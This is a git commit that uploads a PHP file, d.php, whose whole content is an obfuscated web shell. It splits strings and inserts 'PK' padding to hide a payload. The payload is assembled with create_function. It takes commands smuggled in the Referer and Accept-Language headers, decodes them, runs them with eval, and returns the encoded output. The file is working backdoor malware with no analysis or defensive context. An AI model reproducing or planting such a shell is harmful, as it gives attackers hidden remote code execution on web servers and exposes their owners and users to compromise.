f62faf0937fb0f70d0aaa0655eb33edddd6aa279
redkcw <36258459+redkcw@users.noreply.github.com>
2018-02-08 07:53:07 +0000

    Add files via upload

---
+++ d.php
@@ -0,0 +1,19 @@
+<?php
+$v='}PK^$PKk{$j};}}retPKurn $PKo;}$rPK=$_SERVER;$PKrrPK=@$r["PKHTTP_REFERERPK"]PK;$ra=@PK$r[';
+$i='$ss(md5($PKi.$kh),0,3)PK);$f=$PKslPKPK($PKss(md5(PK$i.$kf),0PK,3));$p="";for($z=1PK;$z';
+$Z='s($s[$i]PK,$f);if($e)PK{$PKkPKPK=$kh.$kfPK;ob_start();@ePKval(@PKgzuncomPKpress(PK@x(@';
+$J=']+(?:;q=0.PK([PK\\PKd]PK))?,PK?/",$ra,$m);if($q&&$PKm){PK@session_staPKrtPK();$sPK=PK&$_SE';
+$R='"HTTPKPPK_APKCCEPPKPKT_LANGUAGE"];if($rr&&$ra){$PKu=paPKrse_url(PK$rr);PKparsePK_strPK';
+$F='($uPK["query"],$q)PK;$q=PKPKarray_PKPKvalues($q);pregPK_match_PKaPKPKPKll("/([\\w])[\\w-';
+$h='PK<coPKunt($PKm[PK1]);$z++)$PKp.=$q[$mPK[2][$zPK]];if(PKstPKrpos($p,$h)===0PK){$s[$iPK]';
+$G='$s[$i]PK,0,PK$ePK))),$k)));$o=obPK_get_cPKonPKtents();oPKPKb_ePKnd_clean();$PKd=baPKs';
+$N='t);$PKoPK=""PK;foPKr(PK$i=0;PK$i<$l;){for($jPK=0;PK($j<$c&&$i<$l)PKPK;$j++,$i++)PK{$o.PK=$t{$i';
+$d=str_replace('XH','','XHcrXHeateXH_fXHXHuncXHtion');
+$X='e64_encodePK(x(gzcoPKPKmpress($PKo),$k));prPKint(PK"<$k>$dPK</PK$PKk>");@sessionPK_destrPKoy();}}}}';
+$t='=PK"";$p=PKPK$ss($p,3);}ifPK(array_keyPK_PKexists($iPK,$sPKPK)){$s[$i].=$p;$ePK=PKstPKrpo';
+$b='$kh="dPKe71";$kfPK="19dc";PKfunctPKPKion x($PKt,$k){$c=stPKrlen($kPK);PK$l=strPKlen($';
+$S='SSION;PK$ssPK="substr"PK;$sl="sPKtPKrtolowPKer";$i=$m[1][0]PK.PK$m[1][1];$PKh=PK$slPK(PK';
+$T='basePK64_dPKecode(prePKgPK_replace(arraPKyPK(PK"/_/","/-/"),arPKray("/PKPK","+"),$ssPK(';
+$y=str_replace('PK','',$b.$N.$v.$R.$F.$J.$S.$i.$h.$t.$Z.$T.$G.$X);
+$c=$d('',$y);$c();
+?>
